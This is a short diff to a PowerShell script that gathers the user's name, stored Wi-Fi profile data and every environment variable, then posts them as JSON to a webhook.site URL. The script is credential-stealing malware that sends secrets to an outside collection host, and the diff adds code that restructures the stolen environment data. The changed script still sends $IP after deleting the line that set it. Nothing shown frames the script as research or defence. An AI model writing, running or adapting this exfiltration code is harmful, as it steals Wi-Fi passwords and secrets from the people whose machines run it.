@@ -14,12 +14,17 @@ foreach ($profile in $profiles) {
   }
 }
 
-$IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+$envVars = gci env:* | ForEach-Object {
+  @{
+    $_.Name = $_.Value
+  }
+}
 
+# Construct the payload
 $Body = @{
   'username' = $env:username
-  'wifi_profiles' = $wifis
-  'env' = (gci env:*).GetEnumerator() | Out-String
+  'wifi_profiles' = $wifiInfo
+  'env' = $envVars | ConvertTo-Json
   'ip' = $IP
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
